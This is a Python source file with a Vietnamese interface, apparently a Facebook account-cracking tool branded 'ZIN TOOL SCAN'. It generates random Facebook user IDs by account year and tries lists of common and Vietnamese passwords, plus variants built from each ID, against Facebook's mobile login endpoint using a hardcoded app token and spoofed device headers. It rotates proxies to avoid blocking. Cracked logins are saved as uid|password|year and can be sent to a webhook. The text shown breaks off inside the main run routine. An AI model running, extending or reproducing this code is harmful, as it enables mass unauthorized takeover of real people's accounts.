#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════╗
║   ZIN SCAN VIA - VĨNH HẰNG THIÊN TÔN                      ║
╚══════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import uuid
import string
import random
import time
import re
import signal
import asyncio
from datetime import datetime
from pathlib import Path

# ─── Dependency check ───
_MISSING = []
try:
    import httpx
except ImportError:
    _MISSING.append("httpx")
try:
    import aiofiles
except ImportError:
    _MISSING.append("aiofiles")
if _MISSING:
    sys.stderr.write(
        f"ERROR: Missing: {', '.join(_MISSING)}\n"
        f"Install: pip install {' '.join(_MISSING)}\n"
    )
    sys.exit(1)

try:
    _HTTPX_VER = tuple(int(x) for x in httpx.__version__.split(".")[:2]
                        if x.isdigit())
except (ValueError, AttributeError):
    _HTTPX_VER = (0, 0)
_HTTPX_NEW_PROXY_API = _HTTPX_VER >= (0, 26)


# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════
_HOME = Path.home()

def _detect_default_out():
    try:
        if os.path.isdir("/sdcard") and os.access("/sdcard", os.W_OK):
            return "/sdcard"
    except (OSError, PermissionError):
        pass
    return str(_HOME)

CONFIG = {
    "output_dir": _detect_default_out(),
    "state_file": str(_HOME / "zin_state.json"),
    "proxy_file": str(_HOME / "proxies.txt"),
    "concurrency": 80,
    "queue_maxsize": 300,
    "uid_generate_chunk": 30_000,
    "worker_poll_timeout": 0.15,
    "rate_limit": 0,
    "max_retries": 3,
    "retry_backoff": 2.0,
    "timeout": 15.0,
    "enable_proxy": False,
    "enable_resume": True,
    "smart_passwords": True,
    "notify_webhook": "",
    "webhook_timeout": 10.0,
    "save_formats": ["txt"],
    "max_limit": 500_000,
    "verify_tls": True,
    "dry_run": False,
    "beep": True,
}


# ═══════════════════════════════════════════════════════════
# ANSI
# ═══════════════════════════════════════════════════════════
class C:
    R  = '\033[0m'; B  = '\033[1m'; D  = '\033[2m'
    RED    = '\033[38;5;196m'; ORANGE = '\033[38;5;208m'
    YELLOW = '\033[38;5;226m'; GREEN  = '\033[38;5;46m'
    CYAN   = '\033[38;5;51m';  BLUE   = '\033[38;5;27m'
    PURPLE = '\033[38;5;129m'; PINK   = '\033[38;5;213m'
    GOLD   = '\033[38;5;220m'; WHITE  = '\033[38;5;231m'
    GRAY   = '\033[38;5;245m'; LIME   = '\033[38;5;154m'
    AQUA   = '\033[38;5;123m'; VIOLET = '\033[38;5;171m'
    CRIMSON= '\033[38;5;161m'; SKY    = '\033[38;5;117m'
    CLEAR  = '\033[K'

RAINBOW  = [C.RED, C.ORANGE, C.YELLOW, C.GREEN, C.CYAN, C.BLUE, C.PURPLE]
RAINBOW2 = [C.PINK, C.CRIMSON, C.ORANGE, C.GOLD, C.LIME, C.AQUA, C.SKY, C.VIOLET]


# ═══════════════════════════════════════════════════════════
# UI
# ═══════════════════════════════════════════════════════════
def rainbow(text, palette=None):
    palette = palette or RAINBOW
    return "".join(palette[i % len(palette)] + ch
                   for i, ch in enumerate(text)) + C.R


def rainbow_border(char="═", width=58, palette=None):
    palette = palette or RAINBOW
    return "".join(palette[i % len(palette)] + char
                   for i in range(width)) + C.R


def centered_box(text, width=58):
    if len(text) + 2 > width:
        width = len(text) + 4
    top    = "╔" + "═" * (width - 2) + "╗"
    bottom = "╚" + "═" * (width - 2) + "╝"
    blank  = "║" + " " * (width - 2) + "║"
    pad_total = (width - 2) - len(text)
    pad_left  = pad_total // 2
    pad_right = pad_total - pad_left
    print(rainbow(top))
    print(rainbow(blank, palette=RAINBOW2))
    print(C.CYAN + "║" + C.R + " " * pad_left +
          rainbow(text, palette=RAINBOW) +
          " " * pad_right + C.CYAN + "║" + C.R)
    print(rainbow(blank, palette=RAINBOW2))
    print(rainbow(bottom))


def print_logo():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except OSError:
        pass
    print()
    print("  " + rainbow_border("✦", 58))
    print()
    centered_box("ZIN TOOL SCAN - VĨNH HẰNG THIÊN TÔN", width=58)
    print()
    print("  " + rainbow_border("✦", 58, palette=RAINBOW2))
    print()


def mini_sep():
    print(f"  {C.GRAY}{'·' * 58}{C.R}")


def safe_beep():
    if CONFIG["beep"]:
        try:
            sys.stdout.write('\a'); sys.stdout.flush()
        except OSError:
            pass


# ═══════════════════════════════════════════════════════════
# UID GENERATOR
# ═══════════════════════════════════════════════════════════
SERIES_MAP = {
    "1": ("2011-2012", ("100009",), 9),
    "2": ("2010",      ("10001",), 10),
    "3": ("2009",      ("1000000","1000001","1000002",
                        "1000003","1000004","1000005"), 9),
    "4": ("2008",      ("1000000",), 8),
    "5": ("2007",      ("10000000",), 7),
    "6": ("2005-2006", ("100000000",), 6),
    "7": ("RANDOM MIX", "RANDOM", 0),
}

RANDOM_PREFIX_POOL = (
    ("100009",     9),
    ("10001",     10),
    ("100001",     9),
    ("100011",     9),
    ("1000000",    8),
    ("1000001",    8),
    ("1000010",    8),
    ("1000100",    8),
    ("1000002",    8),
    ("1000101",    8),
    ("10000000",   7),
    ("10000001",   7),
    ("10000010",   7),
    ("10000100",   7),
    ("10001000",   7),
    ("100000000",  6),
    ("100000001",  6),
    ("100000010",  6),
    ("100000100",  6),
    ("100001000",  6),
    ("100010000",  6),
    ("1000000000", 5),
    ("1000000001", 5),
    ("1000000010", 5),
    ("100000",     9),
    ("100010",     9),
    ("100100",     9),
)


def generate_uid(prefixes, body_len):
    if not prefixes:
        raise ValueError("prefixes rỗng")
    if not isinstance(body_len, int) or not (1 <= body_len <= 15):
        raise ValueError(f"body_len không hợp lệ: {body_len!r}")
    pfx  = random.choice(prefixes)
    body = ''.join(random.choice(string.digits) for _ in range(body_len))
    uid  = pfx + body
    if not uid.isdigit():
        raise RuntimeError(f"UID sinh chứa ký tự lạ: {uid!r}")
    return uid


def generate_uid_batch_unique(prefixes, body_len, count, seen_global=None):
    if seen_global is None:
        seen_global = set()
    uids = []
    max_attempts = count * 10 + 1000
    attempts = 0
    while len(uids) < count and attempts < max_attempts:
        try:
            uid = generate_uid(prefixes, body_len)
        except ValueError:
            attempts += 1
            continue
        attempts += 1
        if uid in seen_global:
            continue
        seen_global.add(uid)
        uids.append(uid)
    if len(uids) < count:
        sys.stderr.write(
            f"[Generator] Chỉ sinh được {len(uids)}/{count} UID\n")
    return uids


def generate_uid_random_mix(count, seen_global=None):
    if seen_global is None:
        seen_global = set()
    uids = []
    max_attempts = count * 10 + 1000
    attempts = 0
    while len(uids) < count and attempts < max_attempts:
        prefix, body_len = random.choice(RANDOM_PREFIX_POOL)
        try:
            uid = generate_uid((prefix,), body_len)
        except ValueError:
            attempts += 1
            continue
        attempts += 1
        if uid in seen_global:
            continue
        seen_global.add(uid)
        uids.append(uid)
    if len(uids) < count:
        sys.stderr.write(
            f"[Generator] Chỉ sinh được {len(uids)}/{count} UID\n")
    return uids


# ═══════════════════════════════════════════════════════════
# UID → YEAR MAP
# ═══════════════════════════════════════════════════════════
UID_YEAR_MAP = (
    ("100009",     9, "2011-2012"),
    ("10001",     10, "2010"),
    ("1000000",    9, "2009"),
    ("1000000",    8, "2008"),
    ("10000000",   7, "2007"),
    ("100000000",  6, "2005-2006"),
    ("1000000000", 5, "2004-"),
    ("100001",     9, "2011-2012"),
    ("100011",     9, "2011-2012"),
    ("1000001",    8, "2008"),
    ("1000010",    8, "2008"),
    ("1000100",    8, "2008"),
    ("1000002",    8, "2008"),
    ("1000101",    8, "2008"),
    ("10000001",   7, "2007"),
    ("10000010",   7, "2007"),
    ("10000100",   7, "2007"),
    ("10001000",   7, "2007"),
    ("100000001",  6, "2005-2006"),
    ("100000010",  6, "2005-2006"),
    ("100000100",  6, "2005-2006"),
    ("100001000",  6, "2005-2006"),
    ("100010000",  6, "2005-2006"),
    ("1000000001", 5, "2004-"),
    ("1000000010", 5, "2004-"),
    ("100000",     9, "2011-2012"),
    ("100010",     9, "2011-2012"),
    ("100100",     9, "2011-2012"),
)

_UID_YEAR_SORTED = tuple(sorted(UID_YEAR_MAP, key=lambda x: -len(x[0])))


def get_account_year(uid):
    if not uid or not uid.isdigit():
        return "unknown"
    for prefix, body_len, year in _UID_YEAR_SORTED:
        if uid.startswith(prefix) and len(uid) == len(prefix) + body_len:
            return year
    n = len(uid)
    if n == 15: return "2008-2012"
    if n == 16: return "2009-2010"
    if n == 14: return "2007-2008"
    if n == 13: return "2006-2007"
    if n == 12: return "2005-2006"
    if n == 11: return "2004-2005"
    return "unknown"


# ═══════════════════════════════════════════════════════════
# PASSWORD STRATEGY
# ═══════════════════════════════════════════════════════════
class PasswordStrategy:
    BASE = (
        '123456', '1234567', '12345678', '123456789', '1234567890',
        '123123', '112233', 'password', 'password123', 'qwerty',
        'abc123', '111111', 'iloveyou', 'admin', 'welcome',
        'monkey', 'login', 'letmein', '000000', '00000000',
        '12345678a', '12345678Aa', 'Aa123456', 'aA123456',
        'a123456', 'A123456', '123456aA', '123456Aa',
        'admin123', 'admin@123', 'root', 'toor', 'guest',
        'test', 'test123', 'abc12345', 'abcd1234', '1q2w3e4r',
        'qwerty123', 'qwertyuiop', 'asdfghjkl', 'zxcvbnm',
        'matkhau', 'matkhau123', 'khongcopass', 'khongcomatkhau',
    )
    VN_COMMON = (
        'khongco', 'chaoem', 'yeuem', 'anhyeuem', 'emyeuanh',
        'yeu123', 'yeu', 'anhem', 'emyeu', 'chongyeu', 'voye',
        'conyeu', 'me', 'ba', 'ong', 'noi', 'ngayeu',
        'sinh', 'sinhnhat', 'sinh1999', 'sinh2000', 'sinh2001',
        'sinh2002', 'sinh2003', 'sinh2004', 'sinh2005',
        'ngaysinh', 'ngaythang', 'thang', 'nam',
        'thanhcong', 'thanhcong123', 'thanhcong2024',
        'vietnam', 'vietnam123', 'saigon', 'hanoi',
        'hanoi123', 'vietnamese', 'vietnam2024',
    )
    YEARS = tuple(str(y) for y in range(1990, 2021))
    HOT_YEARS_20XX = tuple(str(y) for y in range(2000, 2016))

    @staticmethod
    def generate(uid):
        pw_set = set(PasswordStrategy.BASE)
        if CONFIG["smart_passwords"]:
            digits = re.findall(r'\d+', uid)
            if digits:
                tail  = digits[-1]
                tail8 = tail[-8:]
                tail6 = tail[-6:]
                tail4 = tail[-4:] if len(tail) >= 4 else ""

                pw_set.add(tail)
                pw_set.add(tail8)
                pw_set.add(tail6)
                if tail4:
                    pw_set.add(tail4)

                pw_set.add(tail + "a")
                pw_set.add(tail + "A")
                pw_set.add(tail + "1")
                pw_set.add(tail + "Aa")
                pw_set.add(tail + "aA")
                pw_set.add(tail + "@")
                pw_set.add("a" + tail)
                pw_set.add("A" + tail)
                pw_set.add("1" + tail)

                pw_set.add(tail[::-1])
                pw_set.add(tail8[::-1])
                pw_set.add(tail6[::-1])

                for year in PasswordStrategy.YEARS:
                    if year in tail:
                        pw_set.add(year)
                        pw_set.add("sinh" + year)
                        pw_set.add("fb" + year)
                        pw_set.add(year + "a")
                        pw_set.add("a" + year)

                for year in PasswordStrategy.HOT_YEARS_20XX:
                    pw_set.add(year)
                    pw_set.add("sinh" + year)
                    pw_set.add("fb" + year)
                    pw_set.add(year + "a")
                    pw_set.add("a" + year)
                    pw_set.add("pass" + year)
                    pw_set.add(year + "pass")

                if tail6:
                    pw_set.add(tail6 + "123")
                    pw_set.add("123" + tail6)
                    pw_set.add(tail6 + "@")
                    pw_set.add(tail6 + "#")
                    pw_set.add(tail6 + "!")

                pw_set.add("khongcopass" + tail6)
                pw_set.add(tail6 + "123456")
                pw_set.add("123456" + tail6)

            for pw in PasswordStrategy.VN_COMMON:
                pw_set.add(pw)
        pw_set.discard("")
        return list(pw_set)


# ═══════════════════════════════════════════════════════════
# PROXY MANAGER
# ═══════════════════════════════════════════════════════════
class ProxyManager:
    SCHEMES = ("http://", "https://", "socks4://", "socks5://")

    def __init__(self, proxy_file):
        self.proxies = []
        self.dead    = set()
        self.idx     = 0
        self.lock    = asyncio.Lock()
        if CONFIG["enable_proxy"] and Path(proxy_file).is_file():
            try:
                with open(proxy_file, encoding="utf-8") as f:
                    for raw in f:
                        line = raw.strip()
                        if not line or line.startswith("#"):
                            continue
                        if not line.startswith(self.SCHEMES):
                            line = "http://" + line
                        self.proxies.append(line)
            except OSError as e:
                sys.stderr.write(
                    f"[ProxyManager] Không đọc {proxy_file}: {e}\n")

    async def get(self):
        if not self.proxies:
            return None
        async with self.lock:
            if len(self.dead) >= len(self.proxies):
                self.dead.clear()
            for _ in range(len(self.proxies)):
                p = self.proxies[self.idx % len(self.proxies)]
                self.idx += 1
                if p not in self.dead:
                    return p
            self.dead.clear()
            p = self.proxies[self.idx % len(self.proxies)]
            self.idx += 1
            return p

    async def mark_dead(self, proxy):
        if proxy:
            async with self.lock:
                self.dead.add(proxy)


# ═══════════════════════════════════════════════════════════
# STATS
# ═══════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.start_time = time.time()
        self.tried   = 0
        self.ok      = 0
        self.cp      = 0
        self.twofa   = 0
        self.err     = 0
        self.out_err = 0
        self.retry   = 0

    def uptime(self):
        return max(1e-6, time.time() - self.start_time)

    def rate(self):
        return self.tried / self.uptime()

    def status_line(self):
        total_err = self.err + self.out_err
        return (
            f"\r  {C.PURPLE}✦{C.R} "
            f"{C.GRAY}OK:{C.R}{C.GREEN}{self.ok:<4}{C.R}"
            f"{C.GRAY}│{C.R}"
            f"{C.GOLD}CP:{C.R}{C.YELLOW}{self.cp:<4}{C.R}"
            f"{C.GRAY}│{C.R}"
            f"{C.RED}2FA:{C.R}{C.PINK}{self.twofa:<3}{C.R}"
            f"{C.GRAY}│{C.R}"
            f"{C.RED}Err:{C.R}{C.CRIMSON}{total_err:<3}{C.R}"
            f"{C.GRAY}│{C.R}"
            f"{C.CYAN}Try:{C.R}{C.WHITE}{self.tried:<6}{C.R}"
            f"{C.GRAY}│{C.R}"
            f"{C.VIOLET}{self.rate():.0f}/s{C.R}"
            f"{C.CLEAR}"
        )


# ═══════════════════════════════════════════════════════════
# OUTPUT MANAGER (chỉ TXT — format uid|password|year)
# ═══════════════════════════════════════════════════════════
class OutputManager:
    KINDS = ("ok", "cp", "2fa")

    def __init__(self, out_dir, series_label="series"):
        self.out_dir = Path(out_dir)
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        safe = re.sub(r'[^\w\-]', '_', series_label.lower()).strip('_')
        self.label = safe or "series"
        self.files = {}
        self.locks = {}
        self._init_files_sync()

    def _init_files_sync(self):
        for kind in self.KINDS:
            self.files[kind] = {
                "txt": self.out_dir /
                       f"zin_{kind}_{self.label}_{self.timestamp}.txt",
            }
            for f in self.files[kind].values():
                self.locks[f] = asyncio.Lock()

    async def save(self, kind, uid, password, status="ok", proxy=""):
        year = get_account_year(uid)
        errors = []
        succeeded = 0

        try:
            async with self.locks[self.files[kind]["txt"]]:
                async with aiofiles.open(self.files[kind]["txt"], "a",
                                          encoding="utf-8") as f:
                    await f.write(f"{uid}|{password}|{year}\n")
            succeeded += 1
        except OSError as e:
            errors.append(f"txt: {e}")

        if succeeded == 0:
            raise IOError(
                f"OutputManager.save({kind}) thất bại: {'; '.join(errors)}"
            )
        if errors:
            sys.stderr.write(
                f"[OutputManager] save({kind}) cảnh báo: {errors}\n"
            )

    async def finalize(self):
        return


# ═══════════════════════════════════════════════════════════
# STATE MANAGER
# ═══════════════════════════════════════════════════════════
class StateManager:
    MAX_MEMORY_TESTED = 100_000

    def __init__(self, path):
        self.path = Path(path)
        self.data = {"last_uid": None, "tested": [], "series": ""}
        if CONFIG["enable_resume"] and self.path.is_file():
            try:
                with open(self.path, encoding="utf-8") as f:
                    loaded = json.load(f)
                    if isinstance(loaded, dict):
                        self.data.update(loaded)
            except (OSError, json.JSONDecodeError) as e:
                sys.stderr.write(f"[StateManager] Bỏ qua state lỗi: {e}\n")
        self.tested_set = set(self.data.get("tested", []))
        self._save_lock = asyncio.Lock()

    def is_tested(self, uid):
        return uid in self.tested_set

    async def mark_tested(self, uid):
        self.tested_set.add(uid)
        if len(self.tested_set) > self.MAX_MEMORY_TESTED:
            keep = list(self.tested_set)[-int(self.MAX_MEMORY_TESTED * 0.75):]
            self.tested_set = set(keep)
        self.data["tested"] = list(self.tested_set)
        self.data["last_uid"] = uid

    async def save(self):
        async with self._save_lock:
            try:
                self.path.parent.mkdir(parents=True, exist_ok=True)
            except OSError:
                pass

            payload = json.dumps(self.data, ensure_ascii=False, indent=2)
            tmp = self.path.with_name(self.path.name + ".tmp")

            try:
                async with aiofiles.open(tmp, "w", encoding="utf-8") as f:
                    await f.write(payload)
                try:
                    tmp.replace(self.path)
                    return
                except OSError:
                    pass
            except OSError:
                pass

            try:
                async with aiofiles.open(self.path, "w",
                                          encoding="utf-8") as f:
                    await f.write(payload)
                try:
                    if tmp.exists():
                        tmp.unlink()
                except OSError:
                    pass
            except OSError as e:
                sys.stderr.write(f"[StateManager] Save lỗi: {e}\n")


# ═══════════════════════════════════════════════════════════
# ASYNC CHECKER
# ═══════════════════════════════════════════════════════════
UA_POOL = (
    'Dalvik/1.6.0 (Linux; U; Android 6.0.1; Nexus 6P Build/MMB29P) '
    '[FBAN/FB4A;FBAV/109.0.0.15.70;]',
    'Dalvik/2.1.0 (Linux; U; Android 11; SM-A125F Build/RP1A.200720.012) '
    '[FBAN/FB4A;FBAV/300.0.0.30.115;]',
    'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SP1A.210812.016) '
    '[FBAN/FB4A;FBAV/350.0.0.32.105;]',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 '
    'Chrome/120.0.0.0 Mobile',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
    'Chrome/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
    'AppleWebKit/605.1.15 Safari/605.1.15',
)

API_URL = "https://b-graph.facebook.com/auth/login"


class AsyncChecker:
    def __init__(self, proxy_mgr, stats, outputs, state):
        self.proxy_mgr = proxy_mgr
        self.stats     = stats
        self.outputs   = outputs
        self.state     = state
        self.semaphore = asyncio.Semaphore(CONFIG["concurrency"])
        self.rate_lock = asyncio.Lock()
        self.last_req  = 0.0
        self.client    = None

    async def __aenter__(self):
        limits = httpx.Limits(
            max_connections=CONFIG["concurrency"] + 50,
            max_keepalive_connections=CONFIG["concurrency"],
        )
        self.client = httpx.AsyncClient(
            timeout=CONFIG["timeout"],
            limits=limits,
            verify=CONFIG["verify_tls"],
            follow_redirects=True,
            http2=False,
        )
        return self

    async def __aexit__(self, *args):
        if self.client:
            try:
                await self.client.aclose()
            except Exception as e:
                sys.stderr.write(f"[Checker] close client lỗi: {e}\n")

    async def _rate_limit(self):
        if CONFIG["rate_limit"] <= 0:
            return
        async with self.rate_lock:
            now = time.time()
            min_interval = 1.0 / CONFIG["rate_limit"]
            delta = now - self.last_req
            if delta < min_interval:
                await asyncio.sleep(min_interval - delta)
            self.last_req = time.time()

    def _build_request(self, uid, password):
        data = {
            'adid': str(uuid.uuid4()),
            'email': uid,
            'password': password,
            'cpl': 'true',
            'credentials_type': 'device_based_login_password',
            'source': 'device_based_login',
            'error_detail_type': 'button_with_disabled',
            'format': 'json',
            'generate_session_cookies': '1',
            'generate_analytics_claim': '1',
            'generate_machine_id': '1',
            'family_device_id': str(uuid.uuid4()),
            'advertiser_id': str(uuid.uuid4()),
            'locale': 'en_US',
            'client_country_code': 'US',
            'device_id': str(uuid.uuid4()),
            'method': 'auth.login',
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class':
                'com.facebook.account.login.protocol.Fb4aAuthHandler',
        }
        headers = {
            'content-type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'Authorization':
                'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent': random.choice(UA_POOL),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-device-group': '5120',
            'x-fb-session-id':
                'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid='
                + uuid.uuid4().hex,
            'x-fb-connection-bandwidth':
                str(random.randint(20000000, 30000000)),
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': uuid.uuid4().hex,
            'x-fb-friendly-name': 'ViewerReactionsMutation',
            'accept-encoding': 'gzip, deflate',
            'x-fb-http-engine': 'Liger',
        }
        return data, headers

    def _proxy_kwargs(self, proxy):
        if not proxy:
            return {}
        if _HTTPX_NEW_PROXY_API:
            return {"proxy": proxy}
        return {"proxies": {"all://": proxy}}

    async def _single_request(self, uid, password, proxy=None):
        if CONFIG["dry_run"]:
            return {"_dry_run": True}, None
        data, headers = self._build_request(uid, password)
        try:
            r = await self.client.post(
                API_URL, data=data, headers=headers,
                **self._proxy_kwargs(proxy),
            )
            if r.status_code >= 500:
                return None, f"http_{r.status_code}"
            if r.status_code == 429:
                return None, "http_429"
            try:
                return r.json(), None
            except ValueError:
                return None, "invalid_json"
        except httpx.TimeoutException:
            return None, "timeout"
        except httpx.ProxyError:
            return None, "proxy_dead"
        except httpx.ConnectError:
            return None, "connect_error"
        except httpx.HTTPError as e:
            return None, f"http_{type(e).__name__}"
        except Exception as e:
            return None, f"err_{type(e).__name__}"

    async def _request_with_retry(self, uid, password, proxy=None):
        last_err = None
        for attempt in range(CONFIG["max_retries"]):
            if attempt > 0:
                self.stats.retry += 1
            resp, err = await self._single_request(uid, password, proxy)
            if resp is not None:
                return resp, None, proxy
            last_err = err
            if err == "proxy_dead" and proxy:
                await self.proxy_mgr.mark_dead(proxy)
                proxy = await self.proxy_mgr.get()
            if err in ("http_429", "http_503"):
                wait = CONFIG["retry_backoff"] ** attempt + random.uniform(0, 1)
                await asyncio.sleep(wait)
            else:
                await asyncio.sleep(0.5 * (attempt + 1))
        return None, last_err, proxy

    async def check_account(self, uid):
        try:
            await self._check_account_inner(uid)
        except asyncio.CancelledError:
            raise
        except IOError as e:
            self.stats.out_err += 1
            sys.stderr.write(f"[Checker] OUTPUT ERROR uid={uid}: {e}\n")
            self._render_status()
        except Exception as e:
            self.stats.err += 1
            sys.stderr.write(
                f"[Checker] EXCEPTION uid={uid}: "
                f"{type(e).__name__}: {e}\n")
            self._render_status()

    async def _check_account_inner(self, uid):
        if self.state.is_tested(uid):
            return
        passwords = PasswordStrategy.generate(uid)
        proxy = await self.proxy_mgr.get()

        for pwd in passwords:
            async with self.semaphore:
                await self._rate_limit()
                resp, err, proxy = await self._request_with_retry(
                    uid, pwd, proxy)

            self.stats.tried += 1
            self._render_status()

            if resp is None:
                self.stats.err += 1
                continue

            if CONFIG["dry_run"]:
                self._render_success(uid, pwd, proxy)
                await self.outputs.save("ok", uid, pwd, "ok", proxy)
                self.stats.ok += 1
                break

            if isinstance(resp, dict) and 'access_token' in resp:
                self._render_success(uid, pwd, proxy)
                await self.outputs.save("ok", uid, pwd, "ok", proxy)
                self.stats.ok += 1
                await self._notify_webhook("OK", uid, pwd, proxy)
                break

            err_obj = resp.get('error', {}) if isinstance(resp, dict) else {}
            msg  = str(err_obj.get('message', ''))
            code = err_obj.get('code', 0)

            if 'www.facebook.com' in msg or code == 401:
                self._render_cp(uid, pwd, proxy)
                await self.outputs.save("cp", uid, pwd, "checkpoint", proxy)
                self.stats.cp += 1
                await self._notify_webhook("CP", uid, pwd, proxy)
                break

            if 'two-factor' in msg.lower() or 'two_factor' in msg.lower():
                self._render_2fa(uid, pwd, proxy)
                await self.outputs.save("2fa", uid, pwd, "2fa", proxy)
                self.stats.twofa += 1
                await self._notify_webhook("2FA", uid, pwd, proxy)
                break

        await self.state.mark_tested(uid)
        if (self.stats.tried % 50) == 0:
            await self.state.save()

    def _render_status(self):
        try:
            sys.stdout.write(self.stats.status_line())
            sys.stdout.flush()
        except OSError:
            pass

    def _box(self, color, title, uid, pwd, proxy):
        bar = "═" * 45
        lines = [
            f"  {color}{C.B}╔{bar}╗{C.R}",
            f"  {color}{C.B}║{C.R} {C.WHITE}{C.B}{title}{C.R}",
            f"  {color}{C.B}║{C.R} {C.CYAN}UID  :{C.R} {C.WHITE}{uid}{C.R}",
            f"  {color}{C.B}║{C.R} {C.YELLOW}PASS :{C.R} {C.WHITE}{pwd}{C.R}",
        ]
        if proxy:
            lines.append(
                f"  {color}{C.B}║{C.R} {C.GRAY}PROXY:{C.R} {C.WHITE}{proxy}{C.R}")
        lines.append(f"  {color}{C.B}╚{bar}╝{C.R}")

        try:
            sys.stdout.write("\r" + C.CLEAR)
            sys.stdout.write("\n".join(lines) + "\n")
            sys.stdout.flush()
        except OSError:
            pass
        safe_beep()

    def _render_success(self, uid, pwd, proxy):
        self._box(C.GREEN, "✨ SUCCESS ✨", uid, pwd, proxy)

    def _render_cp(self, uid, pwd, proxy):
        self._box(C.GOLD, "◐ CHECKPOINT ◐", uid, pwd, proxy)

    def _render_2fa(self, uid, pwd, proxy):
        self._box(C.PINK, "🔐 2FA DETECTED", uid, pwd, proxy)

    async def _notify_webhook(self, status, uid, pwd, proxy):
        if not CONFIG["notify_webhook"] or not self.client:
            return
        payload = {
            "content": f"**[{status}]** Hit!\n"
                       f"UID: `{uid}`\nPASS: `{pwd}`\n"
                       f"Proxy: `{proxy or 'none'}`"
        }
        asyncio.create_task(self._send_webhook_safe(payload))

    async def _send_webhook_safe(self, payload):
        try:
            await asyncio.wait_for(
                self.client.post(CONFIG["notify_webhook"], json=payload),
                timeout=CONFIG["webhook_timeout"],
            )
        except (httpx.HTTPError, asyncio.TimeoutError, asyncio.CancelledError):
            pass
        except Exception as e:
            sys.stderr.write(f"[Webhook] Lỗi: {e}\n")


# ═══════════════════════════════════════════════════════════
# SIGNAL
# ═══════════════════════════════════════════════════════════
_STOP_EVENT = None


def install_signal_handlers(loop, stop_event):
    def _handler():
        stop_event.set()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, _handler)
        except (NotImplementedError, RuntimeError, ValueError):
            pass


# ═══════════════════════════════════════════════════════════
# APP
# ═══════════════════════════════════════════════════════════
class ZinApp:
    MENU = (
        ("1", "2011-2012", C.PINK,    "🌸"),
        ("2", "2010",      C.CRIMSON, "🔥"),
        ("3", "2009",      C.ORANGE,  "🍊"),
        ("4", "2008",      C.GOLD,    "🌟"),
        ("5", "2007",      C.LIME,    "🍀"),
        ("6", "2005-2006", C.AQUA,    "💎"),
        ("7", "RANDOM MIX (All Series)", C.VIOLET, "🎲"),
        ("0", "EXIT",      C.GRAY,    "🚪"),
    )

    def main(self):
        print_logo()
        print(f"  {C.VIOLET}{C.B}[ CHỌN PHƯƠNG PHÁP ]{C.R}")
        mini_sep()
        for num, name, color, icon in self.MENU:
            if name == "EXIT":
                print(f"  {color}{C.B}[{C.WHITE}{num}{color}]{C.R} {icon}  "
                      f"{C.B}{name}{C.R}")
            elif "RANDOM" in name:
                print(f"  {color}{C.B}[{C.WHITE}{num}{color}]{C.R} {icon}  "
                      f"{C.B}{name}{C.R}")
            else:
                print(f"  {color}{C.B}[{C.WHITE}{num}{color}]{C.R} {icon}  "
                      f"{C.B}{name}{C.R} METHOD")
        mini_sep()
        print(f"  {C.GOLD}⚡ ZIN TOOL SCAN - VĨNH HẰNG THIÊN TÔN{C.R}")
        print()
        try:
            sel = input(f"  {C.CYAN}{C.B}➤ Chọn: {C.R}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)

        if sel == "0":
            sys.exit(0)
        if sel not in SERIES_MAP:
            print(f"  {C.RED}✗ Lựa chọn không hợp lệ{C.R}")
            time.sleep(1)
            self.main()
            return

        name, prefixes, body_len = SERIES_MAP[sel]
        self.run(name, prefixes, body_len)

    def run(self, name, prefixes, body_len):
        print_logo()
        print(f"  {C.YELLOW}{C.B}📋 SERIES: {C.WHITE}{name}{C.R}")
        mini_sep()

        is_random = (prefixes == "RANDOM")
        if is_random:
            print(f"  {C.VIOLET}🎲 Random mix tất cả series "
                  f"(2005-2012){C.R}")
        else:
            print(f"  {C.GRAY}Body length: {body_len} chữ số{C.R}")
        print(f"  {C.GRAY}Ví dụ: 1000, 5000, 10000{C.R}")

        try:
            raw = input(f"  {C.CYAN}{C.B}➤ Số lượng: {C.R}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)

        try:
            limit = int(raw)
        except (ValueError, TypeError):
            print(f"  {C.RED}✗ Không phải số hợp lệ{C.R}")
            time.sleep(1)
            self.run(name, prefixes, body_len)
            return

        if limit <= 0:
            print(f"  {C.RED}✗ Số lượng phải > 0{C.R}")
            time.sleep(1)
            self.run(name, prefixes, body_len)
            return
        if limit > CONFIG["max_limit"]:
            print(f"  {C.RED}✗ Vượt giới hạn ({CONFIG['max_limit']}){C.R}")
            time.sleep(1)
            self.run(name, prefixes, body_len)
            return

        try:
            asyncio.run(self._run_async(name, prefixes, body_len, limit))
        except KeyboardInterrupt:
            print(f"\n  {C.RED}⏹ Dừng bởi người dùng{C.R}")

    async def _run_async(self, name, prefixes, body_len, limit):
        global _STOP_EVENT
        _STOP_EVENT = asyncio.Event()
        loop = asyncio.get_running_loop()
        install_signal_handlers(loop, _STOP_EVENT)

        proxy_mgr = ProxyManager(CONFIG["proxy_file"])
        stats     = Stats()

        is_random = (prefixes == "RANDOM")
        series_label = "random" if is_random else name

        outputs = OutputManager(CONFIG["output_dir"],
                                 series_label=series_label)
        state   = StateManager(CONFIG["state_file"])
        state.data["series"] = name

        # Header info
        print_logo()
